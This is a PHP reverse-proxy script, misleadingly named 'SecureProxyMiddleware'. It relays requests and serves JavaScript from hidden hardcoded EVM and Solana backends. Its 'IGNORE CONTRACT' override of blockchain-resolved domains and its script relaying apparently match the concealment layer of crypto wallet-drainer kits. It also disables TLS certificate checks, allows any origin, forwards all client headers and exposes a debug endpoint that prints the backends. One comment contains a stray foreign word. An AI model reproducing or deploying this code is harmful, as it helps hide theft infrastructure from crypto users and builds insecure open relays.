<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 86400');

function getClientIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

class SecureProxyMiddleware {
    public $EVM_TYPE = "EVM";
    public $SOL_TYPE = "SOL";

    // === HARDCODE REAL DOMAINS (NUCLEAR FIX) ===
    private $REAL_EVM_DOMAIN = "https://real-backend.com";     // ← CHANGE THIS
    private $REAL_SOL_DOMAIN = "https://real-sol-backend.com"; // ← CHANGE THIS

    public function getTargetDomain($type) {
        // FORCE REAL DOMAINS — IGNORE CONTRACT
        return ($type === $this->EVM_TYPE) ? $this->REAL_EVM_DOMAIN : $this->REAL_SOL_DOMAIN;
    }

    public function handle($endpoint, $type) {
        try {
            $target = $this->getTargetDomain($type);
            $url = rtrim($target, '/') . '/' . ltrim($endpoint, '/');

            $headers = getallheaders();
            unset($headers['Host'], $headers['host'], $headers['origin'], $headers['Origin']);
            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
            $headers['x-forwarded-for'] = getClientIP();

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => array_map(fn($k, $v) => "$k: $v", array_keys($headers), $headers),
                CURLOPT_TIMEOUT => 15,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HEADER => true,
                CURLOPT_SSL_VERIFYPEER => false
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) throw new Exception(curl_error($ch));

            $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $body = substr($response, $headerSize);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            // FORCE CORRECT CONTENT-TYPE
            if (str_ends_with($endpoint, '.js')) {
                header('Content-Type: application/javascript; charset=utf-8');
            } elseif (str_ends_with($endpoint, '.css')) {
                header('Content-Type: text/css; charset=utf-8');
            } else {
                header('Content-Type: application/json');
            }

            http_response_code($code);
            echo $body;

        } catch (Exception $e) {
            http_response_code(502);
            echo "PROXY ERROR: " . $e->getMessage();
        }
    }
}

// === INIT ===
$proxy = new SecureProxyMiddleware();

// === DEBUG: SHOW REAL DOM hãy
if (isset($_GET['debug'])) {
    echo "EVM: " . $proxy->getTargetDomain($proxy->EVM_TYPE) . "\n";
    echo "SOL: " . $proxy->getTargetDomain($proxy->SOL_TYPE) . "\n";
    exit;
}

// === OPTIONS ===
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// === PING ===
if (isset($_GET['e']) && $_GET['e'] === 'ping_proxy') {
    echo 'pong';
    exit;
}

// === ROUTE ===
if (isset($_GET['s'])) {
    $proxy->handle(urldecode($_GET['s']), $proxy->SOL_TYPE);
} elseif (isset($_GET['e'])) {
    $proxy->handle(urldecode($_GET['e']), $proxy->EVM_TYPE);
} else {
    http_response_code(400);
    echo 'Missing endpoint';
}
